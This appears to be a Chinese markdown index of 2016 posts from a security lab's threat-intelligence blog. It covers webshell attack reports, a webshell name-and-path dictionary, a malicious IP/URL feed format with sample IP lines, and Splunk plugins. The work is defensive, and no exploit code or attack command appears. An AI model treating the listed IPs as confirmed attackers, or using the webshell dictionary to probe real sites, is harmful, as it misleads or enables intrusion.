+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1680664275&idx=1&sn=72ec295e92cfd8213f88768df2993edf&scene=4#wechat_redirect
+
+#守望者安全监测（2016/4/1）—webshell攻击信息
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1694027803&idx=1&sn=b5b4d1110c81764364f5ac0809404387&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Websehll样本名称及密码
+
+#守望者webshell安全监测周报（2016/4/9）
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1723708622&idx=1&sn=8b36beda011b1af8a851f90dd0bb4993&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Websehll样本名称及密码
+
+#看一看威胁情报相关的安全分析插件（Splunk平台）
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483657&idx=1&sn=21188429ba828c611e9084aa54a2264a&scene=4#wechat_redirect
+
+1. DNS Analytics
+
+    通过DNS分析服务器server或终端的异常行为。可以确认已知、未知的恶意软件、APT攻击以及实时监测内部的威胁。备注：需要有对外的API接口查询安全QB
+
+1. Symantec DeepSight Security Intelligence App for SplunkEnterprise
+
+    Symantec DeepSight主要提供IPReputation、Domain/URL Reputation等安全信息，用以检测恶意的攻击行为。splunk支持对deepsight信息的分析和可视化展示，包括恶意ip、恶意url、恶意域名等。
+
+1. Tango Honeypot Intelligence
+
+    通过splunk可以能够查看蜜罐日志，对蜜罐网络的信息进行可视化展示，查看恶意的攻击行为。
+
+1. Vormetric Security Intelligence
+
+    Vormetric公司主要业务是数据安全管理，该app通过对Vormetric的加密终端和管理平台的日志信息的再分析，提供了自身的安全情报报告和搜索操作。
+
+1. Webroot BrightCloud Threat Intelligence Add-on for Splunk
+
+    Webroot公司通过其BrightCloud平台的信息统计。展示其威胁情报的相关信息。
+
+#守望者安全监测（2016/4/16）—Webshell攻击信息
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483660&idx=1&sn=c9b6fbcac3e497f5fca80e2f4deddcb0&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Websehll样本名称及密码
+
+#流量安全分析（八）：对Upatre和Dyre病毒报文进行分析
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483673&idx=1&sn=dc8fa578d928b8375fd0f56ceb6fa7ea&scene=4#wechat_redirect
+
+#国外开源威胁情报feed站点相关介绍（1）
+
+1. blocklist.de
+
+    主要收集攻击的恶意ip。网站按攻击目标分类，比如针对ssh服务、mail服务、imap服务、ftp服务、apache服务，该站点最主要的数据是bots数据。
+1. openphish.com
+
+    专门提供钓鱼仿冒网站信息的一个开源站点，很聚焦
+1. www.malwaredomains.com
+
+    仅仅提供恶意软件DNS的信息。
+1. spamhaus
+
+    spamhaus，它是一个国际性非营利组织，其主要任务是跟踪国际互联网的垃圾邮件团伙，实时黑名单技术，协助执法机构辨别，追查全世界的垃圾邮件，并游说各国政府制订有效的反垃圾邮件法案。
+1. vxvault.net
+
+    以恶意软件为主，主要提供恶意的url及文件。通过该网站可以收集到大量的url和恶意软件样板
+    关联其他分析平台(比如VT\HYB)的分析结果也是这个网站的特色之一。
+
+#威胁情报feed：每天更新，每天20万+条数据，敬请试用！！
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483695&idx=1&sn=c8d12405b07ae984ce3993998caa70f2&scene=4#wechat_redirect
+
+威胁情报feed，是指可以将威胁情报自动化的向现有安全防护体系提供，通过现有安全体系实现对威胁的防范、响应等。常见的威胁情报feed包括了域名、ipv4、url、邮箱、恶意软件md5等。
+
+守望者一直在关注国外的开源威胁情报feed站点，我们会对这些站点的数据进行统一的汇集、分类、分析，提供给相关的安全设备商。目前开源情报收集每天有20万+的TI-feed数据，包括恶意的IP、dns、url、邮箱、md5等。我们会按照标准格式每天提供一个DAT格式文件供使用。威胁情报feed：每天更新，每天20万+条数据，敬请试用！
+
+收集的来源包括：alexa.com、malwaredomains.com、blocklist.de、openphish.com、isc.sans.edu、osint.bambenekconsulting.com、malwareursl.joxeankoret.com、spamhaus.org、stracker.abuse.ch、rules.emergingthreats.net、nothink.org、mirc.com、feodotracker.abuse.cn、txt.proxyspy.net、botscout.com、vxault.net、csirtg.io、dragonresearchgroup.org、sslbl.abuse.ch、ckermail.net、www.us.openbl.org、palevotracker.abuse.ch、ransomware.abuse.cn、danger.rulez.sk、phishtank.com、autoshun.org、anti-phishing-email-reply。
+
+##TI-Feed文件说明
+
+![TI-Feed](./img/Webshell/TI-Feed.png)
+![TI-Feed字段](./img/Webshell/TI-Feed字段.png)
+
+#开源威胁情报Feed：数据优化（1）
+
+守望者发布开源威胁情报feed数据一周时间来，有不少使用者在数据质量上提了不少问题和建议。Feed数据每天一个DAT格式文件。包括恶意的IP、dns、url、邮箱、md5等。目前还是ftp方式供下载使用。具体feed格式参考了国外的威胁情报服务商cyren等数据格式。
+
+##Feed数据优化方法
+
+1. 恶意IP地址
+
+    1. 命中率检测
+
+        将每天的数据导入流量较大的生产环境中，观察每天的命中率情况，命中者提高信誉值。
+        命中率是检测feed质量的纬度之一。
+    1. 存活率确认
+
+        利用批量Ping工具、全端口扫描检测现有IP地址库的存活率情况，我们后面会加一个字段来表示当天该IP地址是否存活，这样可以给数据使用厂商更多灵活调整的空间；
+    1. 地址分类优化
+
+        将IP地址分为国外IP地址，国内IP地址，（可借助IPIP.NET 或者其它的库来批量检测）并设计一个字段来表示；
+    1. 端口探测？
+
+        对检测到存活的IP地址进行端口探测，检测出所有的端口开放情况和服务开放情况。小伙伴提的建议不错，这个目前watcerlab还在考虑中。
+
+1. 恶意URL地
+
+    1. 存活检测
+
+        利用批量工具或者脚本批量检测URL是否存活，存活的进行标识；
+    1. URL分类
+
+        对URL进行分类，分为国内，国外并提供一个字段标识；针对国内的采用烽火台联盟的思睿嘉得有网址分类引擎，如果是钓鱼网页能够区分类型比如：招商银行的，国家电网的等等；
+    1. 针对性测试？
+
+        这个根据恶意URL的标签，可以进行针对性的测试，这个目前watcerlab还在考虑中。
+
+1. 恶意DNS地址址
+
+    1. 存活检测
+
+        通过批量工具向邮箱发送邮件看email是真的存在，提供一个字段标识；
+    1. 地址分类
+
+        将Email邮箱按照地址分类，先做最基本的要分出国内，国外，后面考虑更细致划分。
+1. 恶意Email邮箱
+
+    1. 存活检测
+
+        通过批量工具向邮箱发送邮件看email是真的存在，提供一个字段标识；
+    1. 地址分类
+
+        将Email邮箱按照地址分类，先做最基本的要分出国内，国外，后面考虑更细致划分。
+1. 恶意文件MD5
+
+    1. 匹配查询
+    通过向其它的情报库查询是否有关联数据判断MD5的质量。
+    国外的有 [VirusTotal][UrlQuery][TotalHash] [ThreatExpert]，国内的有烽火台联盟的ALICE平台、微步等。
+
+#守望者安全监测（2016/4/24）—Webshell攻击信息
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483701&idx=1&sn=62759efa8a7c9cfb61e96ea5d6507746&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Websehll样本名称及密码
+
+#威胁情报Feed：Webshell之常用“路径&名字”字典
+
+##概述
+守望者实验室开发的基于流量的Webshell检测系统，近期捕获了数量相当可观攻击信息，我们以周报的形式公布了一些攻击者来源IP地址、受攻击的网站列表（脱敏）、攻击频率、使用的Webshell文件名和密码等。
+为帮助大家更好的防御和检测Webshell，可以更主动的扫描方式去检测webshell，我们定期对数据进行分析优化，总结相关的Webshell特征。
+我们将字典分为两种：
+1. 纯文件名字典；
+
+    包含精简的Webshell文件名称；
+1. 路径字典；
+
+    包含精简的Webshell全路径地址；
+
+#信息安全分析师实践：splunk平台分析app制作教程
+
+##安全分析插件
+
+守望者前段时间刚分析了一下Splunk App For EnterpriseSecurity，并总结了篇文章《看一看威胁情报相关的安全分析插件（Splunk平台）》请关注守望者实验室可阅读。目前团队为了将分析能力实体化，最近也基于安全实践经验结合用户的实际需求制作了专门的的Splunk App ForEnterprise Security。
+
+##安全分析app制作流程与方法
+
+Splunk 是机器数据的引擎。使用 Splunk 可收集、索引和利用所有应用程序、服务器和设备（物理、虚拟和云中）生成的快速移动型计算机数据，从一个位置搜索并分析所有实时和历史数据。 
+Splunk的所有应用app都在应用里面（包含通常所用的Search & Reporting），实现简单的app可以参考以下流程
+
+1. 创建app
+1. 丰富app内容
+1. 修改页面呈现
+
+#安全分析app（1）： watcherlab-FA-splunk（web日志安全分析）下载&说明
+
+我们会将watcherlab打造一个安全分析的社区共享平台，后续陆续推出新的基于不同平台的分析app。感谢sizeof小伙伴的辛苦和努力，提供的watcherlab-FA-splunk及详细的说明材料。
+
+##安全分析插件FA-App说明
+名称：FA-App
+下载地址： https://www.watcherlab.com/file/download/FA.tar.gz
+    
+
+
+#守望者安全监测（2016/5/2）—Webshell攻击信息
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483730&idx=1&sn=5650e78a873a9c2b108dc4a9e47fe163&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Websehll样本名称及密码
+
+#流量分析样例：对入侵PACP原始报文进行分析&Nuclear EK
+
+原始PCAP 数据包下载:http://www.watcherlab.com/file/download/traffic-analyse.pcap
+
+#守望者威胁情报Feed(2016/5/3)：推出国内版feed
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483742&idx=1&sn=638d23104bc96a0f3a6c02dd4c81a758&scene=4#wechat_redirect
+
+守望者发布开源威胁情报feed数据一段时间来，小伙伴们在数据质量上提了不少问题和建议，比如能否提供针对国内版本的feed、如何提升Feed质量等，针对众多的问题我们做出了第一步的优化措施接下来我们还将做更多的工作来优化Feed的质量。
+
+本次的数据优化如下：
+1. 提供针对国内版本的IP地址数据；
+1. 对IP地址的存活性进行校验；
+1. 对存活的IP地址添加了新的 端口 标签。
+
+Feed数据每天一个DAT格式文件。包括恶意的IP、dns、url、邮箱、md5等。目前还是ftp方式供下载使用。具体feed格式参考了国外的威胁情报服务商cyren等数据格式。
+
+#威胁情报Feed之FAQ (2016/5/5)：恶意ip-feed格式
+
+守望者发布开源威胁情报feed数据一段时间来，小伙伴们在数据质量上提了不少问题和建议，有小伙伴问：恶意ip-feed文件的各字段格式含义是什么？
+
+##恶意IP-feed字段说明
+- [+/=]：关联标记，+标记表示该条数据在和昨天的数据对比中是新增的，=标记表示该条数据也同样出现在昨天的数据中；
+- [52.58.120.225]：恶意IP的主体，主要的数据；
+- [2016-05-02 23:14:38]：发现时间，该恶意IP被发现具有恶意企图的时间；
+- [2016-05-02 23:14:38]：终止时间，该恶意IP停止攻击或者从监控系统中消失的时间；
+- [['scanner']]：恶意行为，恶意IP是如何被发现的，例如：scanner表示进行恶意扫描行为；
+- [['ssh']]：协议，在何种协议中发现的恶意IP，例如：ssh表示在ssh协议中发现的，结合恶意行为可判断该恶意IP的操作是：进行了扫描式的恶意SSH登陆尝试；
+- [blocklist.de]：情报源，该条情报的来源；
+- [75]：可信度，该恶意IP的可信度，数值越大表示可信度越高；
+- [AR]：国家，该恶意IP的发现国家代码；
+- 目前恶意IP地址库存在有九个标签字段，可以用来做过滤或者重点检测。
+
+##样例
+- `=,78.39.252.125,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,IR`
+- `+,82.209.49.196,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,CZ`
+- `=,78.40.181.45,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,Unknow`
+- `=,104.156.239.154,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,US`
+- `=,117.102.48.44,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,PK`
+- `=,52.87.246.34,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,Unknow`
+- `=,178.212.195.54,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,UA`
+- `=,74.123.74.209,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,US`
+- `=,154.73.28.212,2016-05-0300:34:59,2016-05-03 00:34:59,['proxy'],[],txt.proxyspy.net,75,LY`
+
+#威胁情报Feed之优化需求(5月5日)：问题答复
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483748&idx=1&sn=89b91e0e4b3d779659a4a1b0a3ba4e23&scene=4#wechat_redirect
+
+##问题答复
+问题（1）：恶意ip-feed文件目前是每天全量更新，有些老的IP怎么办，虽然这个ip今天没有做坏事，但是历史上曾做过坏事的IP怎么办，能否提供更长时间的数据？
+解答：现有文件是每天一个版本，后续增加3天一个版本，和7天一个版本，用户更便利的使用。
+ 
+问题（2）：昨天守望者提供了IP的字段说明，对个别字段不清楚含义，能否有字段更详细的说明？
+解答：现我们会对字段的常用标记内容进行详细说明，后面逐步给出。
+ 
+问题（3）：FTP下载方式不便利，有没有其他下载方式？
+解答：后续提供HTTP的下载方式，基础数据免费下载。有些特别敏感的数据提供API的形式。
+ 
+问题（4）：目前的数据源从哪里来？
+解答：开国外开源威胁情报feed的收集占70%左右，国内一手监测的数据占比30%左右。后面我们会逐步加大国内的监控一手数据。
+ 
+问题（5）：有没有定制一些更符合需求的feed？
+解答：我们会进行更深入的数据整合、分析工作，对数据进行分析，提供定制的feed，比如webshell探测&攻击的相关情报feed、比如钓鱼情报、比如国内的恶意ip等。后面我们会逐步梳理需求，对数据源充分分析给出更精准的情报feed。 
+不断聚焦，提供精准需求的情报feed，是我们持续的目标。
+
+#来自守望者实验室的国内Feed对外提供
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=2247483765&idx=1&sn=f64cf77bddf3eca466a50793038c19b1&scene=4#wechat_redirect
+
+守望者实验室的基于流量的Webshell检测系统从上线以来就获得了很多的一手数据
+
+我们提供过：最近的Webshell攻击情况、Webshell名称和密码、Webshell字典等。
+从现在开始我们向外提供基于Webshell攻击的数据提取的Feed，当然现在字段还很简单，实时性也不够，我们在努力改进这些数据的内容以及提供方式。
+
+##DNS Feed
+- [+/=]：关联标记，+标记表示该条数据在和昨天的数据对比中是新增的，=标记表示该条数据也同样出现在昨天的数据中；
+- [www.xxxxx.com]：恶意域名的主体，主要的数据；
+- [2016-05-05 03:32:53]：发现时间，该恶意域名被发现有恶意行为的时间；
+- [2016-05-05 03:32:49]：更新时间，最近一次更新信息的时间；
+- [['phishing']]：恶意行为，，例如：phishing表示具有网络钓鱼的行为；
+- [['dns']]：协议，在何种协议中发现的恶意域名，例如：dns表示在dns协议中发现的，结合恶意行为可判断该恶意域名的定义是：在DNS解析过程中发现的钓鱼网站；
+- [openphish.com]：情报源，该条情报的来源，权威的机构或者组织等；
+- [43.661]：可信度（目前正在统一）；
+
+##URL Feed
+[+/=]：关联标记，+标记表示该条数据在和昨天的数据对比中是新增的，=标记表示该条数据也同样出现在昨天的数据中；
+[http://down.xxxx.pw/cx/setup.exe]：恶意RUL主体；
+[2016-05-05 00:31:56]：发现时间，该恶意IP被发现具有恶意企图的时间；
+[2016-05-05 00:31:56]：更新时间，最近一次更新信息的时间；
+[['malware']]：恶意行为，恶意URL的行为，例如：malware表示恶意软件；
+[malwareurls.joxeankoret.com]：情报源，该条情报的来源，权威的机构或者组织等；
+[1]：版本；
+[65]：可信度，该恶意URL的可信度，数值越大表示可信度越高；
+
+#威胁情报Feed（20160510）：新增“端口”“存活性”字段
+
+情报的质量对应用者来说非常关键，守望者目前实现了两个新增字段，分别是“端口”“存活性”字段，方便情报使用者更有效的进行采用。
+
+1. 端口字段
+
+    我们设计一个字段来标志存活IP的端口信息，我们会对恶意ip进行云端的端口探测，根据端口信息情报的使用者可以对恶意ip有更全面的认识。比如可能是代理服务器，比如可能开启了一些远程管理端口等等。
+1. 存活性字段
+
+    “1”：代表存活
+    “0”：代表非存活。
+    我们设计一个字段来表示当天该IP地址、URL地址是否存活，利用批量Ping工具、端口扫描探测现有IP地址的存活率情况。模拟url访问，根据返回状态码确定url的存活状态。
+    
+
+
+
+
+
+
+
+
+
+
+
